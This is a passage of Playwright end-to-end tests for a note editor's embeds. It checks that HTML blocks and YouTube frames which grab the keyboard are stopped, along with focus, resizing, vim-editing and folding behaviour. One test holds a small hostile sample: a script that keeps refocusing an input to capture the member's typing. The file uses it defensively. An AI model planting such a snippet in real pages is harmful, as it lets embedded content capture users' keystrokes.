  await expect(editor(page)).toBeFocused();
  await page.keyboard.type("TYPED-AFTER", { delay: 20 });
  await expect.poll(() => read(page, note.id)).toContain("typed before it ran. TYPED-AFTER");

  // Shown again, it is stopped again: it can't win by trying often.
  await stopped(page).getByRole("button", { name: "Show it again" }).click();
  await runHtml(page).click();
  await expect(stopped(page)).toBeVisible();
  await expect(page.locator("iframe")).toHaveCount(0);
});

test("a frame that waits for the member to be typing elsewhere is stopped too, with every key in the note", async ({ page }) => {
  const waits = `<input id="i"><script>setTimeout(() => setInterval(() => { window.focus(); document.getElementById("i").focus(); }, 30), 1500);</script>`;
  const note = await open(page, `# Typing\n\n:::html{height=80}\n${waits}\n:::\n\nend line\n`);
  await runHtml(page).click();
  await expect(below(page, "html").locator("iframe")).toBeVisible();
  // The pointer passes over it and leaves, and the member goes back to the note.
  const box = (await below(page, "html").boundingBox())!;
  await page.mouse.move(box.x + 20, box.y + 20);
  await page.mouse.move(box.x + 40, box.y + 30);
  await line(page, "end line").click();
  await page.keyboard.press("End");
  const typed = "abcdefghijklmnopqrstuvwxyz0123456789".repeat(2);
  await page.keyboard.type(typed, { delay: 40 });
  await expect(stopped(page)).toBeVisible();
  await expect(page.locator("iframe")).toHaveCount(0);
  await expect.poll(() => read(page, note.id)).toContain(`end line${typed}`);
});

test("a frame the member clicks into has the keyboard, and gives it back from a button or a click in the note", async ({ page }) => {
  const note = await open(page, `# Typing\n\n:::html{height=80}\n<input id="i" aria-label="Inside">\n:::\n\nend line\n`);
  await runHtml(page).click();
  const inside = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe").getByRole("textbox", { name: "Inside" });
  // A pointer moves before it presses, which is what lets the press through to the frame.
  const pointAt = async () => {
    const box = (await below(page, "html").boundingBox())!;
    await page.mouse.move(box.x + box.width / 2 - 5, box.y + box.height / 2 - 5);
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  };
  await pointAt();
  await inside.click();
  await page.keyboard.type("typed inside");
  await expect(inside).toHaveValue("typed inside");
  await expect(stopped(page)).toHaveCount(0);

  await below(page, "html").getByRole("button", { name: "Back to the note" }).click();
  await expect(editor(page)).toBeFocused();
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type(" typed outside");
  await expect.poll(() => read(page, note.id)).toContain("end line\n typed outside");
  await expect(below(page, "html").getByRole("button", { name: "Back to the note" })).toBeHidden();

  // In again, and out by clicking in the note. It was never stopped, and still holds what was typed in it.
  await pointAt();
  await inside.click();
  await page.keyboard.type(", twice");
  await line(page, "end line").click();
  await page.keyboard.type("!");
  await expect.poll(() => read(page, note.id)).toContain("!");
  await expect(inside).toHaveValue("typed inside, twice");
  await expect(stopped(page)).toHaveCount(0);
  expect(await read(page, note.id)).not.toContain("typed inside");
});

test("another site's frame that takes the keyboard is stopped the same way", async ({ page }) => {
  await page.route(`${PLAYER}**`, (route) => route.fulfill({ contentType: "text/html", body: `<body>${STEALS}` }));
  const note = await open(page, "# Video\n\nWatch ::youtube{https://youtu.be/dQw4w9WgXcQ} now\n\nend line\n");
  await page.keyboard.press("ControlOrMeta+End");
  await below(page, "youtube").getByRole("button", { name: "Play video" }).click();
  await expect(stopped(page)).toContainText("YouTube video was stopped: it tried to take the keyboard while you were typing.");
  await expect(page.locator("iframe")).toHaveCount(0);
  await expect(editor(page)).toBeFocused();
  await page.keyboard.type("TYPED", { delay: 20 });
  await expect.poll(() => read(page, note.id)).toContain("TYPED");
  await stopped(page).getByRole("button", { name: "Show it again" }).click();
  await expect(below(page, "youtube").getByRole("button", { name: "Play video" })).toBeVisible();
});

test("what is below a line can write what it learned into the note, which is where its room is read from", async ({ page }) => {
  // A picture that doesn't know its size until it has loaded: it has a usual room until then, and writes the size once.
  await page.addInitScript(() => {
    const sizeIn = (config: string) => /(\d+)x(\d+)/.exec(config);
    (window as unknown as { __INK_FIXTURE_PLUGINS__: unknown[] }).__INK_FIXTURE_PLUGINS__ = [
      {
        id: "fixture",
        name: "Picture fixture",
        activate(host: { embeds: { register(embed: unknown): void } }) {
          host.embeds.register({
            name: "pic",
            title: "Picture",
            render: (el: HTMLElement) => void (el.textContent = "Picture"),
            below: {
              box({ config }: { config: string }) {
                const size = sizeIn(config);
                return { ratio: size ? Number(size[1]) / Number(size[2]) : 4 / 3 };
              },
              render(el: HTMLElement, embed: { config: string; update(next: { config: string }): void }) {
                const drawn = ((window as unknown as { drawn: string[] }).drawn ??= []);
                drawn.push(embed.config);
                const loaded = el.appendChild(document.createElement("button"));
                loaded.textContent = "It has loaded";
                loaded.addEventListener("click", () => sizeIn(embed.config) || embed.update({ config: `${embed.config} 400x100` }));
              },
            },
          });
        },
      },
    ];
  });
  const note = await open(page, "# Album\n\nabove\n\n::pic{cat}\n\nbelow\n");
  const size = async () => (await placed(page, "pic")).el!.slice(2);
  await expect(below(page, "pic")).toBeVisible();
  const usual = await size();
  expect(usual[0]! / usual[1]!).toBeCloseTo(4 / 3, 1);
  await below(page, "pic").evaluate((el: HTMLElement & { marked?: boolean }) => (el.marked = true));

  await below(page, "pic").getByRole("button", { name: "It has loaded" }).click();
  await expect.poll(() => read(page, note.id)).toBe("# Album\n\nabove\n\n::pic{cat 400x100}\n\nbelow\n");
  await expect.poll(async () => { const [width, height] = await size(); return Math.round(width! / height!); }).toBe(4);
  await expectOverItsRoom(page, "pic", "once its size is in the note");
  expect(await below(page, "pic").evaluate((el: HTMLElement & { marked?: boolean }) => el.marked), "drawn again in the element it had").toBe(true);
  expect(await page.evaluate(() => (window as unknown as { drawn: string[] }).drawn)).toEqual(["cat", "cat 400x100"]);
  // It is the member's edit: one step of undo takes it back, and it is in the note's history as theirs.
  expect((await perform(page, { type: "note.history", id: note.id })).map((c) => c.author.kind)).toEqual(["member", "member"]);
});

test("a playing video goes on through vim's operators, undo and redo, and plugins turned off and on", async ({ page }) => {
  test.slow();
  await page.setViewportSize({ width: 1600, height: 1000 });
  const asked = await standInPlayer(page);
  await signInAsNewPerson(page, "Ada Lovelace");
  await perform(page, { type: "settings.write", text: JSON.stringify({ "vim.enabled": true }), baseRevision: 0 });
  const note = await perform(page, { type: "note.create", text: "# Video\n\nabove one\nabove two\nWatch ::youtube{https://youtu.be/dQw4w9WgXcQ} now\nbelow one\nbelow two\n" });
  await page.goto(`/note/${note.id}`);
  await expect(page.locator(".cm-vim-panel")).toHaveText("--NORMAL--");
  await below(page, "youtube").getByRole("button", { name: "Play video" }).click();
  await expect.poll(() => player(page)?.url()).toContain("dQw4w9WgXcQ");
  const { born } = await playing(player(page)!);
  await watch(page, "youtube");
  let ticks = 0;
  const expectStillPlaying = async (when: string) => {
    await expect.poll(async () => (await playing(player(page)!)).ticks, `counting on ${when}`).toBeGreaterThan(ticks);
    const now = await playing(player(page)!);
    ticks = now.ticks;
    expect(now.born, `the same load ${when}`).toBe(born);
    expect(asked, `asked for once ${when}`).toHaveLength(1);
    expect(await kept(page, "youtube"), `the same element, never moved, ${when}`).toEqual({ same: true, moves: 0 });
  };
  const toLine = async (lineNumber: number) => {
    await editor(page).focus();
    await page.keyboard.type("gg");
    for (let i = 1; i < lineNumber; i++) await page.keyboard.press("j");
  };

  await toLine(4);
  await page.keyboard.type("dd");
  await expect(editor(page)).not.toContainText("above two");
  await expectStillPlaying("after dd on the line above");
  await page.keyboard.press("u");
  await expect(editor(page)).toContainText("above two");
  await expectStillPlaying("after that was undone");
  await page.keyboard.press("Control+r");
  await expect(editor(page)).not.toContainText("above two");
  await expectStillPlaying("after it was redone");
  await page.keyboard.press("u");
  await expect(editor(page)).toContainText("above two");

  // J joins the embed's line onto the one above: it is somewhere else in the note, and the same embed.
  await toLine(4);
  await page.keyboard.press("Shift+J");
  await expect(line(page, "above two")).toContainText("Watch");
  await expectStillPlaying("after its line was joined to the one above");
  await expectOverItsRoom(page, "youtube", "after its line was joined to the one above");
  await page.keyboard.press("u");
  await expectStillPlaying("after the join was undone");

  const run = async (command: string) => {
    await page.keyboard.press("ControlOrMeta+Shift+P");
    await page.getByRole("combobox", { name: "Commands" }).fill(command);
    await expect(page.getByRole("dialog", { name: "Commands" }).getByRole("option").first()).toHaveText(new RegExp(`^${command}`));
    await page.keyboard.press("Enter");
  };
  for (const command of ["Disable plugin: Word count", "Enable plugin: Word count", "Disable plugin: Vim", "Enable plugin: Vim"]) {
    await run(command);
    await expectStillPlaying(`after "${command}"`);
  }

  // Its own line deleted, it is gone. Brought back by undo it is a new one, to be played when asked.
  await expect(page.locator(".cm-vim-panel")).toHaveText("--NORMAL--");
  await toLine(5);
  await page.keyboard.type("dd");
  await expect(below(page, "youtube")).toHaveCount(0);
  await expect.poll(() => player(page)).toBeUndefined();
  await page.keyboard.press("u");
  await expect(below(page, "youtube").getByRole("button", { name: "Play video" })).toBeVisible();
  expect(asked).toHaveLength(1);
});

test("an HTML block's lines fold away when the cursor leaves it, which moves the lines after it, and its frame stays where its room is", async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 1200 });
  await open(page, "# Scene\n\nabove\n\n:::html{height=120}\n<p>one</p>\n<p>two</p>\n<p>three</p>\n:::\n\nafter the block\nand another\n");
  await runHtml(page).click();
  await expect(below(page, "html").locator("iframe")).toBeVisible();
  await settled(page);
  const top = () => line(page, "after the block").evaluate((el) => Math.round(el.getBoundingClientRect().top));
  const outside = await top();
  await editor(page).getByRole("button", { name: "HTML" }).click();
  await expect(editor(page)).toContainText(":::html{height=120}");
  await expectOverItsRoom(page, "html", "with the block shown as written");
  // Five lines as written in place of the one line of its button.
  const lineHeight = await line(page, "after the block").evaluate((el) => el.getBoundingClientRect().height);
  expect((await top()) - outside).toBeGreaterThan(3 * lineHeight);
  await page.keyboard.press("ControlOrMeta+Home");
  await expect.poll(top).toBe(outside);
  await expectOverItsRoom(page, "html", "with the block folded again");
});
